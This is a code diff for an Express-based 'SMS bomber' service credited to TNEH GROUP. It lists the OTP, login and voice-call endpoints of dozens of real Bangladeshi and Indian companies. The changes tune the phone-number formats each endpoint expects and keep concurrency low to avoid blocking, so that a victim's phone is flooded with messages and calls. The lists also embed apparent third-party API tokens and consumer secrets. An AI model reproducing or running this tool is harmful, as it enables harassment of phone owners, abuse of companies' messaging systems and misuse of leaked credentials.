@@ -1,6 +1,6 @@
 // ============================================================
-// ULTIMATE SMS BOMBER V10.0 — api/index.js (TNEH GROUP Edition)
-// Optimized Queue System + New APIs
+// ULTIMATE SMS BOMBER V10.1 — api/index.js (TNEH GROUP Edition)
+// Smart Phone Formatting + Strict Success Detection + Queue System
 // ============================================================
 const express = require('express');
 const axios = require('axios');
@@ -13,9 +13,9 @@ const crypto = require('crypto');
 const CONFIG = {
   server: { port: process.env.PORT || 3000, host: '0.0.0.0' },
   performance: {
-    timeout: 15000, // 15 seconds per request
-    concurrency: 5, // ⚡ এখানে ৫টি রিকোয়েস্ট একসাথে যাবে, বাকিগুলো লাইনে থাকবে (যাতে সাইট ব্লক না করে)
-    maxCountPerAPI: 100
+    timeout: 15000,
+    concurrency: 5,
+    delayBetweenRequests: 50
   },
   security: { rateLimit: { enabled: false } }
 };
@@ -23,13 +23,13 @@ const CONFIG = {
 const DEVELOPER_INFO = {
   developer: "TNEH GROUP",
   telegram: "@tneh_owner",
-  api_version: "10.0.0-TNEH"
+  api_version: "10.1.0-TNEH"
 };
 
 const ERROR_MESSAGES = {
   MISSING_PARAM: 'Missing parameter',
-  INVALID_PHONE: 'Invalid phone',
-  INVALID_API_KEY: 'Invalid key',
+  INVALID_PHONE: 'Invalid phone number',
+  INVALID_API_KEY: 'Invalid or expired API key',
   JOB_NOT_FOUND: 'Job not found'
 };
 
@@ -52,24 +52,39 @@ class Utility {
     const c = this.parsePhone(p);
     return /^(01)[3-9][0-9]{8}$/.test(c) || /^(8801)[3-9][0-9]{8}$/.test(c);
   }
-  // BD API তে পাঠানোর জন্য ফোন নম্বর রেডি করা
   static normalizeBD(p) {
     const c = this.parsePhone(p);
-    if (c.startsWith('01')) return '88' + c; // 017... -> 88017...
-    if (c.startsWith('8801')) return c;       // 88017... -> 88017...
+    if (c.startsWith('8801')) return c.slice(2);
+    if (c.startsWith('880')) return '0' + c.slice(3);
+    if (c.startsWith('01')) return c;
     return c;
   }
   static isValidIN(p) {
     const c = this.parsePhone(p).replace(/^91/, '').replace(/^0+/, '');
     return /^[6-9][0-9]{9}$/.test(c);
   }
-  // IN API তে পাঠানোর জন্য ফোন নম্বর রেডি করা
   static normalizeIN(p) {
     const raw = this.parsePhone(p);
     if (raw.startsWith('91') && raw.length === 12) return raw.slice(2);
     if (raw.startsWith('0')) return raw.slice(1);
     return raw;
   }
+
+  // ✅ প্রতিটি ফরম্যাটের জন্য আলাদা প্লেসহোল্ডার তৈরি
+  static formatPhone(phone, format) {
+    const c = this.parsePhone(phone);
+    const p10 = c.slice(-10); // শুধু ১০ ডিজিট
+    switch (format) {
+      case '10': return p10;                        // 1611229803
+      case '0': return '0' + p10;                   // 01611229803
+      case '880': return '880' + p10;               // 8801611229803
+      case 'plus880': return '+880' + p10;          // +8801611229803
+      case 'plus88': return '+88' + p10;            // +881611229803
+      case '88dash': return '+88-' + p10;           // +88-1611229803
+      default: return c;                             // fallback
+    }
+  }
+
   static formatBytes(b) {
     if (b === 0) return '0 B';
     const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'];
@@ -85,7 +100,8 @@ class Utility {
 const USER_AGENTS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'
+  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15'
 ];
 
 function getHeaders(extra = {}) {
@@ -94,79 +110,79 @@ function getHeaders(extra = {}) {
     'Accept': 'application/json, text/plain, */*',
     'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
     'Connection': 'keep-alive',
+    'Cache-Control': 'no-cache',
     ...extra
   };
 }
 
 // ============================================================
-// BD API LIST (আপনার দেওয়া অরিজিনাল লিস্ট)
+// BD APIs — Smart Formatting (প্রতিটি API-এর জন্য সঠিক ফরম্যাট)
 // ============================================================
 const BD_APIS = [
-  { name: "QuizGiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null" },
-  { name: "Dhaka Bank", method: "POST", url: "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", body: '{"AccessToken":"","TrackingNo":"","mobileNo":"{phone_10}","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}' },
-  { name: "Circle Robi", method: "POST", url: "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn={phone}" },
-  { name: "Shajgoj", method: "POST", url: "https://shop.shajgoj.com/wp-admin/admin-ajax.php", body: 'action=xoo_ml_login_with_otp&xoo-ml-phone-login={phone_10}&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp', isFormData: true },
-  { name: "KhaoDao", method: "POST", url: "https://api.eat-z.com/auth/customer/signin", body: '{"username":"+{phone}"}' },
-  { name: "TheMallBD", method: "POST", url: "https://themallbd.com/api/auth/otp_login", body: '{"phone_number":"+{phone}"}' },
+  // ---- APIs that need 880XXXXXXXXXX ----
+  { name: "QuizGiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone_10}&country_code=+880&fcm_token=null" },
+  { name: "Circle Robi", method: "POST", url: "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn={phone_880}" },
+  { name: "KhaoDao", method: "POST", url: "https://api.eat-z.com/auth/customer/signin", body: '{"username":"{phone_plus880}"}' },
+  { name: "TheMallBD", method: "POST", url: "https://themallbd.com/api/auth/otp_login", body: '{"phone_number":"{phone_plus88}"}' },
   { name: "Fundesh Win", method: "POST", url: "https://win.fundesh.com.bd/authSrv/auth/generateOtp", body: '{"msisdn":"{phone_10}","clientId":"d2c_client"}' },
-  { name: "Arogga", method: "POST", url: "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0", body: 'mobile=+{phone}', isFormData: true },
-  { name: "OsudPotro", method: "POST", url: "https://api-2.osudpotro.com/api/v1/users/send_otp", body: '{"mobile":"+88-{phone_10}","deviceToken":"web","language":"en","os":"web"}' },
-  { name: "Bongo", method: "POST", url: "https://api.bongo-solutions.com/auth/api/login/send-otp", body: '{"operator":"all","msisdn":"{phone}"}' },
-  { name: "BTCL MyBTCL", method: "POST", url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", body: '{"phoneNbr":"{phone_10}","email":"","OTPType":1,"userName":""}' },
-  { name: "Bioscope Plus", method: "POST", url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+{phone}"}' },
-  { name: "BD Tickets", method: "POST", url: "https://api.bdtickets.com:20100/v1/auth", body: '{"createUserCheck":true,"phoneNumber":"+{phone}","applicationChannel":"WEB_APP"}' },
-  { name: "Apex4U", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: '{"phoneNumber":"{phone_10}"}' },
-  { name: "Swap", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: '{"phone":"{phone_10}"}' },
-  { name: "Ilyn Global", method: "POST", url: "https://api.ilyn.global/auth/signup", body: '{"phone":{"code":"BD","number":"+{phone}"},"provider":"sms"}' },
-  { name: "Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v3/user/login", body: '{"mobile":"{phone_10}","recaptcha_token":"garibookcaptcha","channel":"web"}' },
-  { name: "Sheba", method: "POST", url: "https://accountkit.sheba.xyz/api/shoot-otp", body: '{"mobile":"+{phone}","app_id":"8329815A6D1AE6DD","api_token":"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}' },
-  { name: "AppLink", method: "POST", url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", body: '{"msisdn":"{phone}"}' },
-  { name: "Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_10}" },
-  { name: "GP Web Login", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", body: 'msisdn={phone_10}', isFormData: true },
-  { name: "Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: '{"mobile_no":"{phone_10}"}' },
-  { name: "DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+{phone}"}' },
-  { name: "ePharma", method: "POST", url: "https://epharma.com.bd/authentication/send-otp", body: 'number=+{phone}', isFormData: true },
-  { name: "Isho", method: "POST", url: "https://www.isho.com/register_otp", body: 'phone={phone_10}&email=test@gmail.com', isFormData: true },
-  { name: "Robi Doorstep", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone_10}","type":"doorstep"}' },
-  { name: "Banglalink", method: "POST", url: "https://web-api.banglalink.net/api/v1/user/otp-login/request", body: '{"mobile":"{phone_10}"}' },
-  { name: "Robi DA NLL", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: '{"msisdn":"{phone_10}"}' },
-  { name: "Redx", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: '{"phoneNumber":"{phone_10}"}' },
-  { name: "Chorki", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", body: '{"number":"+{phone}"}' },
-  { name: "Jatri", method: "POST", url: "https://user-api.jslglobal.co:444/v2/send-otp", body: '{"phone":"+{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}' },
-  { name: "Shikho", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: '{"phone":"{phone_10}","type":"student","auth_type":"signup"}' },
-  { name: "Easy", method: "POST", url: "https://core.easy.com.bd/api/v1/forgot-password-otp", body: '{"device_key":"2ea97d276a980993308116baa292cec9","mobile":"{phone_10}"}' },
-  { name: "Walton", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create", body: '{"auth":{"countryCode":"880","deviceUuid":"ee757830-f639-12f0-9f4d-2f972746fhg","phone":"{phone_10}"},"captchaToken":"recapcha"}' },
-  { name: "Chardike", method: "POST", url: "https://api.chardike.com/api/otp/send", body: '{"phone":"{phone_10}","otp_type":"login"}' },
-  { name: "Otithee", method: "POST", url: "https://gateway.otithee.com/api/v1/generate-otp", body: '{"request_type":"registration","mobile_number":"{phone_10}"}' },
-  { name: "Mojaru", method: "POST", url: "https://new.mojaru.com/api/student/login", body: '{"mobile_or_email":"{phone_10}"}' },
-  { name: "AppCity", method: "POST", url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", body: '{"mobileNumber":"{phone_10}"}' },
-  { name: "Upay", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: '{"wallet_number":"{phone_10}","geo_location":{"lat":23.89,"long":89.13},"referral":"","firebase_token":"dummy","device_uuid":"c65m117a8cbf5b1851b29f8b","mno":"Robi"}' },
-  { name: "Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: '{"phone":"{phone_10}","intent":"login"}' },
-  { name: "Ostad", method: "POST", url: "https://api.ostad.app/api/v2/user/with-otp", body: '{"msisdn":"{phone_10}"}' },
-  { name: "Hishabee", method: "GET", url: "https://app.hishabee.business/api/V2/otp/send?mobile_number={phone_10}" },
-  { name: "MithaiBD", method: "POST", url: "https://mithaibd.com/api/login/", body: '{"company_id":"2","phone":"{phone_10}","email":"test@mail.com","password1":"pass123","otp_verify":false}' },
-  { name: "Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: '{"mobileNumber":"+{phone}"}' },
-  { name: "Win2gain", method: "GET", url: "https://api.win2gain.com/api/Users/RequestOtp?msisdn={phone}" },
-  { name: "BdStall", method: "POST", url: "https://www.bdstall.com/userRegistration/save_otp_info/", body: 'UserTypeID=2&RequestType=1&Name=Md&Mobile={phone_10}', isFormData: true },
-  { name: "KireiBD", method: "POST", url: "https://app.kireibd.com/api/v2/send-login-otp", body: '{"email":"{phone_10}"}' },
-  { name: "Wafilife", method: "GET", url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone_10}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" },
-  { name: "eTestPaper", method: "POST", url: "https://prod.etestpaper.net/api/v4/auth/otp", body: '{"phone":"{phone_10}","recaptcha":"668be73dcad2999a957ff440"}' },
-  { name: "Sundora", method: "POST", url: "https://api.sundora.com.bd/api/user/customer/", body: '{"customer":{"email":"test{phone_10}@gmail.com","password":"#bUV?3*N7N.g","password_confirmation":"#bUV?3*N7N.g","phone":"+{phone}","first_name":"Test","last_name":"User","newsletter_email":true,"newsletter_sms":true}}' },
-  { name: "Meenabazar", method: "POST", url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone_10}&type=login" },
-  { name: "MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"Test","lastName":"","gender":"M","email":"test{phone_10}@gmail.com","userName":"{phone_10}","password":"Kamrul12345@","confirmPassword":"Kamrul12345@","status":0,"mobile":"{phone_10}","workAreaCategory":2,"createdFrom":0,"createdAt":"{ts}","userNameType":"mobile","countryCode":"88"}' },
-  { name: "RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"Test User","service":"redx","phoneNumber":"{phone_10}"}' },
-  { name: "KhaasFood", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php", body: 'mobileNo=+{phone}&countrycode=+880&csrf=9d9d08e6e5&login=1&json=1&action=digits_check_mob', isFormData: true },
-  { name: "eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone_10}" },
-  { name: "Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: '{"phone":"{phone_10}"}' },
-  { name: "BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: '{"phone":"+{phone}"}' },
-  { name: "Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: '{"phoneNumber":"{phone_10}","requestType":"send","emailConsent":true,"whatsappConsent":true}' },
-  { name: "Binge", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: '{"mobile":"{phone_10}"}' },
-  { name: "NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: '{"phone_number":"{phone_10}"}' },
-  { name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: '{"phone":"{phone_10}","applicationChannel":"WEB_APP"}' }
+  { name: "Arogga", method: "POST", url: "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0", body: 'mobile={phone_plus88}', isFormData: true },
+  { name: "OsudPotro", method: "POST", url: "https://api-2.osudpotro.com/api/v1/users/send_otp", body: '{"mobile":"{phone_88dash}","deviceToken":"web","language":"en","os":"web"}' },
+  { name: "Bongo", method: "POST", url: "https://api.bongo-solutions.com/auth/api/login/send-otp", body: '{"operator":"all","msisdn":"{phone_880}"}' },
+  { name: "BTCL MyBTCL", method: "POST", url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", body: '{"phoneNbr":"{phone_0}","email":"","OTPType":1,"userName":""}' },
+  { name: "Bioscope Plus", method: "POST", url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"{phone_plus880}"}' },
+  { name: "BD Tickets", method: "POST", url: "https://api.bdtickets.com:20100/v1/auth", body: '{"createUserCheck":true,"phoneNumber":"{phone_plus88}","applicationChannel":"WEB_APP"}' },
+  { name: "Apex4U", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: '{"phoneNumber":"{phone_0}"}' },
+  { name: "Swap V2", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: '{"phone":"{phone_0}"}' },
+  { name: "Ilyn Global", method: "POST", url: "https://api.ilyn.global/auth/signup", body: '{"phone":{"code":"BD","number":"{phone_plus880}"},"provider":"sms"}' },
+  { name: "Garibook v3", method: "POST", url: "https://api.garibookadmin.com/api/v3/user/login", body: '{"mobile":"{phone_0}","recaptcha_token":"garibookcaptcha","channel":"web"}' },
+  { name: "Sheba", method: "POST", url: "https://accountkit.sheba.xyz/api/shoot-otp", body: '{"mobile":"{phone_plus88}","app_id":"8329815A6D1AE6DD","api_token":"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}' },
+  { name: "AppLink", method: "POST", url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", body: '{"msisdn":"{phone_880}"}' },
+  { name: "Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_0}" },
+  { name: "GP Web Login", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", body: 'msisdn={phone_0}', isFormData: true },
+  { name: "Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: '{"mobile_no":"{phone_0}"}' },
+  { name: "DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"{phone_plus880}"}' },
+  { name: "ePharma", method: "POST", url: "https://epharma.com.bd/authentication/send-otp", body: 'number={phone_plus88}', isFormData: true },
+  { name: "Isho", method: "POST", url: "https://www.isho.com/register_otp", body: 'phone={phone_0}&email=test@gmail.com', isFormData: true },
+  { name: "Robi Doorstep", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone_0}","type":"doorstep"}' },
+  { name: "Banglalink", method: "POST", url: "https://web-api.banglalink.net/api/v1/user/otp-login/request", body: '{"mobile":"{phone_0}"}' },
+  { name: "Robi DA NLL", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: '{"msisdn":"{phone_0}"}' },
+  { name: "Redx", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: '{"phoneNumber":"{phone_0}"}' },
+  { name: "Chorki", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", body: '{"number":"{phone_plus88}"}' },
+  { name: "Jatri", method: "POST", url: "https://user-api.jslglobal.co:444/v2/send-otp", body: '{"phone":"{phone_plus88}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}' },
+  { name: "Shikho", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: '{"phone":"{phone_0}","type":"student","auth_type":"signup"}' },
+  { name: "Easy", method: "POST", url: "https://core.easy.com.bd/api/v1/forgot-password-otp", body: '{"device_key":"2ea97d276a980993308116baa292cec9","mobile":"{phone_0}"}' },
+  { name: "Walton", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create", body: '{"auth":{"countryCode":"880","deviceUuid":"ee757830-f639-12f0-9f4d-2f972746fhg","phone":"{phone_0}"},"captchaToken":"recapcha"}' },
+  { name: "Chardike", method: "POST", url: "https://api.chardike.com/api/otp/send", body: '{"phone":"{phone_0}","otp_type":"login"}' },
+  { name: "Otithee", method: "POST", url: "https://gateway.otithee.com/api/v1/generate-otp", body: '{"request_type":"registration","mobile_number":"{phone_0}"}' },
+  { name: "Mojaru", method: "POST", url: "https://new.mojaru.com/api/student/login", body: '{"mobile_or_email":"{phone_0}"}' },
+  { name: "AppCity", method: "POST", url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", body: '{"mobileNumber":"{phone_0}"}' },
+  { name: "Upay", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: '{"wallet_number":"{phone_0}","geo_location":{"lat":23.89,"long":89.13},"referral":"","firebase_token":"dummy","device_uuid":"c65m117a8cbf5b1851b29f8b","mno":"Robi"}' },
+  { name: "Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: '{"phone":"{phone_0}","intent":"login"}' },
+  { name: "Ostad", method: "POST", url: "https://api.ostad.app/api/v2/user/with-otp", body: '{"msisdn":"{phone_0}"}' },
+  { name: "Hishabee", method: "GET", url: "https://app.hishabee.business/api/V2/otp/send?mobile_number={phone_0}" },
+  { name: "MithaiBD", method: "POST", url: "https://mithaibd.com/api/login/", body: '{"company_id":"2","phone":"{phone_0}","email":"test{phone_10}@mail.com","password1":"pass123","otp_verify":false}' },
+  { name: "Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: '{"mobileNumber":"{phone_plus88}"}' },
+  { name: "Win2gain", method: "GET", url: "https://api.win2gain.com/api/Users/RequestOtp?msisdn={phone_880}" },
+  { name: "BdStall", method: "POST", url: "https://www.bdstall.com/userRegistration/save_otp_info/", body: 'UserTypeID=2&RequestType=1&Name=Md&Mobile={phone_0}', isFormData: true },
+  { name: "KireiBD", method: "POST", url: "https://app.kireibd.com/api/v2/send-login-otp", body: '{"email":"{phone_0}"}' },
+  { name: "Wafilife", method: "GET", url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone_0}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" },
+  { name: "eTestPaper", method: "POST", url: "https://prod.etestpaper.net/api/v4/auth/otp", body: '{"phone":"{phone_0}","recaptcha":"668be73dcad2999a957ff440"}' },
+  { name: "Sundora", method: "POST", url: "https://api.sundora.com.bd/api/user/customer/", body: '{"customer":{"email":"test{phone_10}@gmail.com","password":"#bUV?3*N7N.g","password_confirmation":"#bUV?3*N7N.g","phone":"{phone_plus88}","first_name":"Test","last_name":"User","newsletter_email":true,"newsletter_sms":true}}' },
+  { name: "Meenabazar", method: "POST", url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone_0}&type=login" },
+  { name: "MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"Test","lastName":"","gender":"M","email":"test{phone_10}@gmail.com","userName":"{phone_0}","password":"Kamrul12345@","confirmPassword":"Kamrul12345@","status":0,"mobile":"{phone_0}","workAreaCategory":2,"createdFrom":0,"createdAt":"{ts}","userNameType":"mobile","countryCode":"88"}' },
+  { name: "RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"Test User","service":"redx","phoneNumber":"{phone_0}"}' },
+  { name: "KhaasFood", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php", body: 'mobileNo={phone_plus88}&countrycode=+880&csrf=9d9d08e6e5&login=1&json=1&action=digits_check_mob', isFormData: true },
+  { name: "eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone_0}" },
+  { name: "Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: '{"phone":"{phone_0}"}' },
+  { name: "BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: '{"phone":"{phone_plus88}"}' },
+  { name: "Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: '{"phoneNumber":"{phone_0}","requestType":"send","emailConsent":true,"whatsappConsent":true}' },
+  { name: "Binge", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: '{"mobile":"{phone_0}"}' },
+  { name: "NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: '{"phone_number":"{phone_0}"}' },
+  { name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: '{"phone":"{phone_0}","applicationChannel":"WEB_APP"}' }
 ];
 
 // ============================================================
-// INDIAN API LIST (আপনার দেওয়া নতুন লিস্ট)
+// INDIAN APIs
 // ============================================================
 const IN_APIS = [
   { name: "Felix XBOM", method: "GET", url: "https://felix-xbom-wyt2.onrender.com/bom?key=demo&num={phone}" },
@@ -185,21 +201,16 @@ const IN_APIS = [
   { name: "Atomic Bomber", method: "GET", url: "https://atomic-bomber.cyclic.app/bomb?num={phone}" },
   { name: "Nuclear Bomber", method: "GET", url: "https://nuclear-bomber.herokuapp.com/api?phone={phone}" },
   { name: "Fury Bomber", method: "GET", url: "https://fury-bomber.vercel.app/api/bomb?number={phone}" },
-
   { name: "Tata Capital Voice", method: "POST", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}' },
   { name: "1MG Voice", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token", headers: { "Content-Type": "application/json" }, body: '{"number":"{phone}","otp_on_call":true}' },
   { name: "Swiggy Call", method: "POST", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
   { name: "Myntra Voice", method: "POST", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
   { name: "Flipkart Voice", method: "POST", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
-  { name: "Amazon Voice", method: "POST", url: "https://www.amazon.in/ap/signin", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phone={phone}&action=voice_otp', isFormData: true },
   { name: "Paytm Voice", method: "POST", url: "https://accounts.paytm.com/signin/voice-otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
-  { name: "Zomato Voice", method: "POST", url: "https://www.zomato.com/php/o2_api_handler.php", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phone={phone}&type=voice', isFormData: true },
-  
   { name: "Hotstar", method: "PUT", url: "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", headers: { "Content-Type": "application/json" }, body: '{"phone_number":"{phone}","country_prefix":"91"}' },
   { name: "AltBalaji", method: "POST", url: "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", headers: { "Content-Type": "application/json" }, body: '{"phone_number":"{phone}","country_code":"91","platform":"web"}' },
   { name: "SonyLIV", method: "POST", url: "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", headers: { "Content-Type": "application/json" }, body: '{"channelPartnerID":"MSMIND","mobileNumber":"{phone}","country":"IN","timestamp":"{ts}"}' },
   { name: "Zee5", method: "GET", url: "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}" },
-
   { name: "Flipkart", method: "POST", url: "https://www.flipkart.com/api/6/user/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"mobileNumber":"{phone}"}' },
   { name: "Amazon", method: "POST", url: "https://www.amazon.in/ap/signin", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'email={phone}&create=1', isFormData: true },
   { name: "Myntra", method: "POST", url: "https://www.myntra.com/gw/mobile-auth/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
@@ -215,34 +226,27 @@ const IN_APIS = [
   { name: "Snapdeal", method: "POST", url: "https://m.snapdeal.com/signupCompleteAjax", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'j_mobilenumber={phone}', isFormData: true },
   { name: "Nykaa", method: "POST", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'source=sms&mobile_number={phone}', isFormData: true },
   { name: "Lenskart", method: "POST", url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", headers: { "Content-Type": "application/json" }, body: '{"phoneCode":"+91","telephone":"{phone}"}' },
-
   { name: "Zomato", method: "POST", url: "https://www.zomato.com/webroutes/auth/login", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","verification_type":"sms"}' },
   { name: "Swiggy", method: "POST", url: "https://www.swiggy.com/mapi/auth/signup", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
   { name: "Dominos", method: "POST", url: "https://api.dominos.co.in/loginhandler/forgotpassword", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
   { name: "KFC", method: "POST", url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", headers: { "Content-Type": "application/json" }, body: '{"phoneNumber":"{phone}"}' },
   { name: "Pizza Hut", method: "POST", url: "https://api.pizzahut.io/v1/otp/generate", headers: { "Content-Type": "application/json" }, body: '{"phone":"+91{phone}"}' },
-
   { name: "IRCTC", method: "POST", url: "https://www.irctc.co.in/api/otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
   { name: "RedBus", method: "GET", url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91" },
   { name: "MakeMyTrip", method: "POST", url: "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered", headers: { "Content-Type": "application/json" }, body: '{"loginId":"{phone}","type":"MOBILE","countryCode":"91"}' },
   { name: "Goibibo", method: "POST", url: "https://www.goibibo.com/api/otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
